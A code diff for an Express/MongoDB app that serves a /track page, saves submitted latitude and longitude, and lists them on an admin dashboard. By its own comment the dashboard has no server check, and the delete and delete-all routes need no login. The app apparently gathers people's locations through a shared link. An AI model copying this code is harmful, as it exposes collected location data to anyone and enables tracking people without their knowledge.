@@ -23,24 +23,42 @@ const LocationSchema = new mongoose.Schema({
 
 const Location = mongoose.model("Location", LocationSchema);
 
-app.get("/", async (req, res) => {
+/* 🔐 LOGIN PAGE */
+app.get("/admin", (req, res) => {
+  res.render("login");
+});
+
+/* 📊 DASHBOARD (NO SERVER CHECK) */
+app.get("/admin/dashboard", async (req, res) => {
   const data = await Location.find().sort({ createdAt: -1 });
   res.render("index", { data });
 });
 
-app.post("/save", async (req, res) => {
-  try {
-    const { lat, lon } = req.body;
-
-    const ip = (await axios.get("https://api64.ipify.org?format=json")).data.ip;
-
-    await Location.create({ lat, lon, ip });
-
-    res.json({ success: true, msg: "🔥 Location Saved Fast!" });
-  } catch (error) {
-    console.log(error);
-    res.json({ success: false, msg: "Server error" });
-  }
+/* 🗑 DELETE SINGLE */
+app.post("/delete/:id", async (req, res) => {
+  await Location.findByIdAndDelete(req.params.id);
+  res.redirect("/admin/dashboard");
 });
 
-app.listen(3000, () => console.log("Server running at http://localhost:3000"));
+/* 🗑 DELETE ALL */
+app.post("/delete-all", async (req, res) => {
+  await Location.deleteMany({});
+  res.redirect("/admin/dashboard");
+});
+
+/* 🎯 TRACK */
+app.get("/track", (req, res) => {
+  res.render("track");
+});
+
+/* SAVE */
+app.post("/save", async (req, res) => {
+  const { lat, lon } = req.body;
+  const ip = (await axios.get("https://api64.ipify.org?format=json")).data.ip;
+  await Location.create({ lat, lon, ip });
+  res.json({ success: true });
+});
+
+app.listen(3000, () =>
+  console.log("Running → http://localhost:3000/track")
+);
